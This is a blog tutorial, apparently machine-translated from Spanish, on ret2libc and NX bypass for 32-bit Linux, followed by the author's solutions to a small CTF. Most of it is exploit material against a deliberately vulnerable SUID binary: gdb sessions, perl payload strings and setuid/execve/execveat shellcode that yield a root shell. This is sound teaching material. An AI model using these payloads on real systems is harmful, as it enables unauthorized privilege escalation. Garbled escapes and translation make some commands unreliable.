---
layout: blog-detail
title: "ret2libc: Firing with its own gun"
date: 2018-07-05T14:33:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - ret2lib
    - stack
    - stack overflow
    - x86
image_src: /assets/uploads/2018/07/puffinsecurity-ret2libc-Disparando-con-su-propia-pistola.jpg
image_height: 1280
image_width: 1920
author: Yago Gutierrez
description: Since 2000, operating systems began to support the NX bit and emulators of it. The PaX patch for Linux (who also includes ASLR), ExecShield (RedHat), W^X (OpenBSD and macOS) and DEP appear (from Windows to WinXP SP2). This protection is to distinguish memory pages permissions...
publish_time: 2018-07-05T14:33:00+00:00
modified_time: 2019-10-10T06:56:54+00:00
comments_value: 0
disqus_identifier: 621
---
Since 2000, operating systems began to support the NX bit and emulators of it. The PaX patch for Linux (who also includes ASLR), ExecShield (RedHat), W^X (OpenBSD and macOS) and DEP appear (from Windows to WinXP SP2). This protection is to distinguish memory pages permissions execution. In this way those pages that load code will execute permissions but not write, should try to write on them the program break, and on the other hand the data pages (stack, heap, .data, .bss) possess permits no writing and execution, and finally certain areas will have read-only permissions (.rel.plt).

Before you start to remember that we still ASLR (`sudo sysctl -w kernel.randomize_va_space = 0`). A when compiling programs from now will be without the parameter gcc-Z execstack. Let’s see what happens when we try to run a program with NX how we are doing.

``$ gcc vuln.c -o vuln -fno-stack-protector -D_FORTIFY_SOURCE=0 -m32 -no-pie -fno-pie  
[...]  
$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 0x37654136  
[*] Exact match at offset 140  
[...]  
(gdb) display/i $pc  
[...]  
(gdb) run `perl -e 'print "A"x144'`  
Starting program: /home/arget/vuln `perl -e 'print "A"x144'` ``

Breakpoint 1, 0x080484dd in print ()  
1: x/i $pc  
\=> 0x80484dd <print+27>: add $0x10,%esp  
(gdb) x/5x $esp  
0xffffd210: 0xffffd220 0xffffd4f4 0xf7e5e549 0x000000c2  
0xffffd220: 0x41414141  
\[…\]  
(gdb) run “\`cat sc.o“perl -e ‘print “A”x(140-33) . “x20xd2xffxff”‘\`”  
Starting program: /home/arget/vuln “\`cat sc.o“perl -e ‘print “A”x(140-33) . “x20xd2xffxff”‘\`”  
\[…\]  
Breakpoint 2, 0x080484f4 in print ()  
1: x/i $pc  
\=> 0x80484f4 <print+50>: ret  
(gdb) nexti  
0xffffd220 in ?? ()  
1: x/i $pc  
\=> 0xffffd220: xor %eax,%eax  
(gdb) nexti

Program received signal SIGSEGV, Segmentation fault.  
0xffffd220 in ?? ()  
It can be seen when attempting to run the start of our shellcode on the stack (`xor eax, eax`) Precisely for not having permits breaks. We can compare the /proc/$pid/mem of a process with executable stack and another with stack protected  

    Protected:
    fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

Unprotected:  
fffdd000-ffffe000 rwxp 00000000 00:00 0 \[stack\]

This protective measure has a very simple solution called ret2libc to jump to a library function. Consider how the stack is when an instruction is performed `call`.

+------------------+ <- EBP
|       ...        |
+------------------+
|       arg1       |
+------------------+
|       arg2       |
+------------------+
         .
         .
+------------------+
|       arg-n      |
+------------------+
|   EIP guardado   |
+------------------+ <- ESP

So that the function finds the arguments it needs over the saved EIP (EBP and stores for function prologue), collecting the EIP saved at the end by `ret`. A feature that we are particularly interested in the library is `system()`, Particularly as `system("/bin/sh")`. Let us now outline the stack of our vulnerable function after the operation (but before the epilogue) by ret2libc.

|buf       |EBP(s)|EIP(s)     | EIP(s) para system | arg de system()   |arg para XXX
+-----+-----  ---+------+-----------+--------------------+-------------------+-------------+-----+
| ... |   Relleno       | &system() |        XXX         |   &"/bin/sh #"    | "/bin/sh #" | ... |
+-----+-----  ---+------+-----------+--------------------+-------------------+-------------+-----+
└ESP             └EBP               └ system() will collect  └---->-------->-----┘
                                      with this ret

\[Where `EBP(s)` Y `EIP(s)` correspond to the EBP saved and EIP stored, respectively ( “s” of “saved”).\]  
Unable to us enter a null byte to end the string “/bin/sh”, place a semicolon character ends command, although when we go out, you try to run as command whatever is behind us, this can be avoided by entering “/bin/sh#” \[or “/bin/sh;#”\].  
I hope it is clear that system () to jump out to the address that is where it says `XXX`, This is because precisely we have placed things to fit according to the first graph, leaving just as if we had entered system() by `call`. In `XXX` We could place then &exit(), which takes as an argument the four bytes located after the address “/bin/sh#” ie, “/bin”.  
It would be nice, before continuing, the reader would understand the operating system() with the command man.We can obtain the addresses of system() and exit() using gdb, at the same time see which direction is our “/bin/sh#”.

`$ gdb -q vuln  
Reading symbols from vuln...(no debugging symbols found)...done.  
(gdb) start  
Temporary breakpoint 1 at 0x8048503  
Starting program: /home/arget/vuln`

Temporary breakpoint 1, 0x08048503 in main ()  
(gdb) p system  
$1 = {<text variable, no debug info>} 0xf7e01f80 <system>  
(gdb) p exit  
$2 = {<text variable, no debug info>} 0xf7df4f10 <exit>  
Since we have the dirs system() and exit() proceed to find which way to place our beautiful chain (remember that as “/bin/sh#” has a space is necessary to quote the whole argument).  
`(gdb) unset environment LINES  
(gdb) unset environment COLUMNS  
(gdb) disas print  
Dump of assembler code for function print:`

    0x080484c2 <+0>:     push   %ebp
       0x080484c3 <+1>:     mov    %esp,%ebp
       0x080484c5 <+3>:     sub    $0x88,%esp
       0x080484cb <+9>:     sub    $0x8,%esp
       0x080484ce <+12>:    pushl  0x8(%ebp)
       0x080484d1 <+15>:    lea    -0x88(%ebp),%eax
       0x080484d7 <+21>:    push   %eax
       0x080484d8 <+22>:    call   0x8048370 <strcpy@plt>
       0x080484dd <+27>:    add    $0x10,%esp
       0x080484e0 <+30>:    sub    $0xc,%esp
       0x080484e3 <+33>:    lea    -0x88(%ebp),%eax
       0x080484e9 <+39>:    push   %eax
       0x080484ea <+40>:    call   0x8048380 <puts@plt>
       0x080484ef <+45>:    add    $0x10,%esp
       0x080484f2 <+48>:    nop
       0x080484f3 <+49>:    leave  
       0x080484f4 <+50>:    ret    

``End of assembler dump.  
(gdb) br *print +50  
Note: breakpoint 1 also set at pc 0x80484f4.  
Breakpoint 1 at 0x80484f4  
(gdb) run "`perl -e 'print "A"x140 . "BBBB" . "CCCC" . "DDDD" . "/bin/sh #"'`"  
Starting program: /home/arget/vuln "`perl -e 'print "A"x140 . "BBBB" . "CCCC" . "DDDD" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD/bin/sh #``

Breakpoint 1, 0x080484f4 in print ()  
(gdb) x/s $esp  
0xffffd29c: “BBBBCCCCDDDD/bin/sh #”  
(gdb)  
We have almost finished exploit. We need only to replace the argument that we have passed the program data just obtain at their sites: B’s by & system, the C’s by &exit, and D’s by the address “/bin/sh#” (0xffffd2a8). exit() takes as an argument “/bin” (0x6e69622f) \[of those bytes will only return 0x2f\], it would be preferable to place here for a 0x00000000 and after that our “/bin/sh#” but we cannot forget that we have the possibility to introduce any invalid one.  
Let’s see what happens when we exploit it  
``(gdb) run "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8xd2xffxff" . "/bin/sh #"'`"  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /home/arget/vuln "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8xd2xffxff" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� �� O������/bin/sh #``

Breakpoint 1, 0x080484f4 in print ()  
(gdb) c  
Continuing.  
sh-4.4$ exit  
\[Inferior 1 (process 9328) exited with code 057\]  
Yes, it worked. Note that the return value is 0x2f program (which is 057 octal).  
Now go outside gdb  
``$ /home/arget/vuln "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8xd2xffxff" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� �� O������/bin/sh #``  
Of course, I could not let me finish the post easily.  
After recalculating the direction of the chain (hint: ltrace shows you the direction of buf)  
``$ /home/arget/vuln "`perl -e 'print "A"x140 . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "x98xd2xffxff" . "/bin/sh #"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� �� O������/bin/sh #  
sh-4.4$``  
Because the internal operation of system() (is the end a execl() to “sh”, so that ruining our SUID). The solution is to run a setuid (0) first …  
Finally, I suggest that you can also search the binary or a bookstore the string “/bin sh”, or local exploits can be used as a method of introducing the chain an environment variable.

We see in the second part of this post.

Exploit the vulnerable program (with SUID enabled) discussed in this post to get root (ejem..setuid (0)) by ret2libc (hint, why have not always skip to the beginning of a function).  
With NX enabled without ASLR ( \*very easy).

In the [previous post](/shellcodes-el-codigo-de-la-cascara/) we started our own small ctf. It consisted of several different shellcodes in a program (code in the previous post, the end). I bring my solution.  
Nothing but start here noting that the program filters us 0x0b byte. It is perfectly possible that the reader does not notice immediately the problem is this, and it turns out that 0x0b is the value that we place in EAX for the syscall execve(). Well, first things first, let’s study the program from the point of view of an exploiter, that is, from our  
`$ sudo sysctl -w kernel.randomize_va_space=0  
[sudo] password for arget:  
kernel.randomize_va_space = 0`

$ gcc a.c -o a -m32 -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z execstack -no-pie -fno-pie

$ sudo chown root:root a

$ sudo chmod u+s a

$ gdb -q a  
Reading symbols from a…(no debugging symbols found)…done.  
(gdb) run \`/opt/metasploit/tools/exploit/pattern\_create.rb -l 2000\`  
Starting program: /home/arget/a \`/opt/metasploit/tools/exploit/pattern\_create.rb -l 2000\`  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co

    Program received signal SIGSEGV, Segmentation fault.
    0x69423569 in ?? ()
    (gdb) 
    [1]+  Stopped                gdb -q a

$ /opt/metasploit/tools/exploit/pattern\_offset.rb -q 0x69423569  
\[\*\] Exact match at offset 1036

$ fg  
gdb -q a

(gdb) disas print  
Dump of assembler code for function imprimir:  
0x08048542 <+0>: push %ebp  
0x08048543 <+1>: mov %esp,%ebp  
0x08048545 <+3>: sub $0x408,%esp  
0x0804854b <+9>: sub $0x8,%esp  
0x0804854e <+12>: push $0xb  
0x08048550 <+14>: pushl 0x8(%ebp)  
0x08048553 <+17>: call 0x80483e0 <strchr@plt>  
0x08048558 <+22>: add $0x10,%esp  
0x0804855b <+25>: test %eax,%eax  
0x0804855d <+27>: je 0x8048564 <imprimir+34>  
0x0804855f <+29>: call 0x8048522 <panic>  
0x08048564 <+34>: sub $0x8,%esp  
0x08048567 <+37>: pushl 0x8(%ebp)  
0x0804856a <+40>: lea -0x408(%ebp),%eax  
0x08048570 <+46>: push %eax  
0x08048571 <+47>: call 0x80483b0 <strcpy@plt>  
0x08048576 <+52>: add $0x10,%esp  
0x08048579 <+55>: sub $0xc,%esp  
0x0804857c <+58>: lea -0x408(%ebp),%eax  
0x08048582 <+64>: push %eax  
0x08048583 <+65>: call 0x80483c0 <puts@plt>  
0x08048588 <+70>: add $0x10,%esp  
0x0804858b <+73>: nop  
0x0804858c <+74>: leave  
0x0804858d <+75>: ret  
End of assembler dump.  
(gdb) br \*print +52  
Breakpoint 1 at 0x8048576  
(gdb) unset environment LINES  
(gdb) unset environment COLUMNS  
(gdb) run \`perl -e ‘print “A”x1036’\`XXXX  
The program being debugged has been started already.  
Start it from the beginning? (y or n) y  
Starting program: /home/arget/a \`perl -e ‘print “A”x1036’\`XXXX

Breakpoint 1, 0x08048576 in print ()  
(gdb) x/5x $esp  
0xffffcb00: 0xffffcb10 0xffffd16b 0xf7ffcfbc 0xf7fd68a6  
0xffffcb10: 0x41414141  
(gdb)

Well, we have control of EIP, easy, right? (For a few days ago it Does not seemed eh).  
In addition we have the address buf.  
Let’s observe what happens when we try to exploit with our shellcode  

    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ebx, esp  
push eax  
push ebx  
mov ecx, esp  
mov al, 0xb ; execve  
xor edx, edx  
int 0x80

$ xxd sc.o  
00000000: 31c0 b0d5 31c9 cd80 31c0 5068 2f2f 7368 1…1…1.Ph//sh  
00000010: 682f 6269 6e89 e350 5389 e1b0 0bcd 80 h/bin..PS……

$ /home/arget/a “\`cat sc.o“perl -e ‘print “A”x(1036-31) . “x10xcbxffxff”‘\`”  
Hacking attempt is detected

The most obvious solution is to make a shellcode to run a `mov al, 0xc; sub al, 0x1`, Ie placed in eax one 0xc and subtract 1 for 0xb well.  

    # Sol 1
    $ cat sc.asm
    BITS 32
    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80
    xor    eax, eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    push   eax
    push   ebx
    mov    ecx, esp
    mov    al, 0xc   ; !!
    sub    al, 0x1   ; !!
    xor    edx, edx
    int    0x80

`  
$ nasm sc.asm -o sc.o`

$ lol sc.o  
\-rw-r–r– 1 arget arget 35 jul 5 11:02 sc.o

$ /home/arget/a \`cat sc.o“perl -e ‘print “A”x(1036-35) . “x10xcbxffxff”‘\`  
1���1�̀1�Ph//shh/bin��PS���  
, 1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
sh-4.4# whoami  
root  
sh-4.4#

The next thing that occurred to me was to find another system call of family exec\*()  
`$ cat /usr/include/asm/unistd_32.h | grep exec  
#define __NR_execve 11  
#define __NR_kexec_load 283  
#define __NR_execveat 358`  
We see our execve() always two more entries. As kexec\_load() serves to load a new kernel (which we are not interested), we have execveat(). On your `man` page we see many interesting things. Basically a code like the following we can open “/bin/sh”

    #include <unistd.h>

int main()  
{  
char \*arg\[2\] = {“/bin/sh”, NULL};  
// int execveat(int dirfd, const char \*pathname, char \*const argv\[\], char \*const envp\[\], int flags);  
execveat(0x12345678, arg\[0\], arg, NULL);  
}

The first argument execveat () is so random just to show what the manual says

> If pathname is absolute, then a dirfd is ignored.

Moreover, the section flags indicates that best left as NULL.  
Possibly that program in C does not compile, because that function is not in the C library

`$ man 3 execveat  
There is no manual registration for execveat in section 3`  
I do not know if any standard as POSIX or another is included. But it gives us the same, (in this case) only played with syscalls, not the library (let the books calm a little).

EAX -> 358                 ; \_\_NR\_execveat
EBX -> xxx                 ; no matter what it contains, it is nothing porn
ECX -> &"/bin/sh"          ; pathname (which is indeed an absolute path)
EDX -> &\["/bin/sh", NULL\]  ; argv
ESI -> NULL                ; envp
EDI -> NULL                ; flags

To see the shellcode

    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ecx, esp ; ecx = pathname = &”/bin/sh”  
push eax  
push ecx  
mov edx, esp ; edx = argv = &\[“/bin/sh”, NULL\]  
mov ax, 0x166 ; eax = \_\_NR\_execveat  
xor esi, esi ; esi = envp = null  
xor edi, edi ; edi = flags = null  
int 0x80

And exploitation  

    # Sol 2
    $ cat sc.asm
    BITS 32
    global _start
    _start:
    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ecx, esp  
push eax  
push ecx  
mov edx, esp  
mov ax, 0x166  
xor esi, esi  
xor edi, edi  
int 0x80

$ ndisasm -b32 sc.o  
00000000 31C0 xor eax,eax  
00000002 B0D5 mov al,0xd5  
00000004 31DB xor ebx,ebx  
00000006 CD80 int 0x80  
00000008 31C0 xor eax,eax  
0000000A 50 push eax  
0000000B 682F2F7368 push dword 0x68732f2f  
00000010 682F62696E push dword 0x6e69622f  
00000015 89E1 mov ecx,esp  
00000017 50 push eax  
00000018 51 push ecx  
00000019 89E2 mov edx,esp  
0000001B 66B86601 mov ax,0x166  
0000001F 31F6 xor esi,esi  
00000021 31FF xor edi,edi  
00000023 CD80 int 0x80

`  
$ lol sc.o  
-rw-r--r-- 1 arget arget 37 jul 5 01:25 sc.o`

$ /home/arget/a \`cat test/sc.o“perl -e ‘print “A”x(1036-37) . “x10xcbxffxff”‘\`  
1���1�̀1�Ph//shh/bin��PQ��f�f 1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
sh-4.4# whoami  
root  
sh-4.4# exit

By strace we can see our performance:  
```$ strace /home/arget/a `cat test/sc.o``perl -e 'print "A"x(1036-37) . "x10xcbxffxff"'`  
execve("/home/arget/a", ["/home/arget/a", "130026032513333152001300Ph//shh/bin211341PQ211342f270f011"...], 0x7fffffffdeb8 /* 38 vars */) = 0  
strace: [ Process PID=3496 runs in 32 bit mode. ]  
access("/etc/suid-debug", F_OK) = -1 ENOENT (No such file or directory)  
[...]  
write(1, "130026032513333152001300Ph//shh/bin211341PQ211342f270f011"..., 10241���1�̀1�Ph//shh/bin��PQ��f�f 1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) = 1024  
write(1, "AAAAAAAAAAAA20313377377n", 17AAAAAAAAAAAA ���  
) = 17  
setuid32(0) = -1 EPERM (Operation not permitted)  
execveat(0, "/bin//sh", ["/bin//sh"], NULL, 0) = 0```

You can see how the call to setuid32() fails, this is because the process does not have permission to change the ruid to 0, since its euid is not 0, a good question is why your euid is not 0 if it is a binary SUID. Because it is executed by strace, who to engage him and I de-bug it if needed to be run with the same privileges as it (cannot come together a process of another user unless you’re root, and we are not running strace as root).

\[By the way, if by some chance it gets a `cd`, will change the value of the variable `pwd` and if it becomes to make a `cd`, also changes the variable `OLDPWD`. You need to be very careful with this, more than once can give you a good headache when it was enough to change terminal or modify these variables, I say it because he just gave me a little problem hahaha\].

One way to run our shellcode the previous post is introduced into an environment variable. We can calculate by [this program](https://gist.github.com/superkojiman/6a6e44db390d6dfc329a) the address of that variable.

    # Sol 3
    $ cat sc.asm
    BITS 32
    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ebx, esp  
push eax  
push ebx  
mov ecx, esp  
mov al, 0xb  
xor edx, edx  
int 0x80

$ nasm sc.asm -o sc.o

$ lol sc.o  
\-rw-r–r– 1 arget arget 33 jul 5 11:51 sc.o

$ export sc=\`cat sc.o\`

$ echo $sc | xxd  
